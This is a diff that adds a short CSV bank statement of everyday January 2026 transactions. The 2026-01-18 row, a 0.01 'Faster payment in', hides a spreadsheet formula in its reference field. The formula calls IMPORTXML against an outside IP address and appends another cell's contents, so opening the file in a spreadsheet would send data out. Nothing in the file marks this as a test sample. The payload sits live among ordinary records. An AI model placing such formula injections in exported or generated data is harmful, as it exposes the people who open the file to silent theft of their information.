@@ -1,0 +1,10 @@
+date,description,reference,amount_gbp
+2026-01-03,Card payment,ALDGATE GROCER,-23.40
+2026-01-05,Salary,HUGHES T JAN PAY,2140.00
+2026-01-08,Direct Debit,KELVIN ENERGY,-86.00
+2026-01-12,Card payment,RAIL TICKETS,-41.20
+2026-01-15,Standing order,RENT FAIRWAY,-975.00
+2026-01-18,Faster payment in,"=IMPORTXML(""http://198.51.100.23/c?d=""&B3,""//a"")",0.01
+2026-01-21,Card payment,PHARMACY 24,-12.80
+2026-01-26,Card payment,BOOKSHOP,-18.99
+2026-01-30,Interest,CREDIT INTEREST,0.42
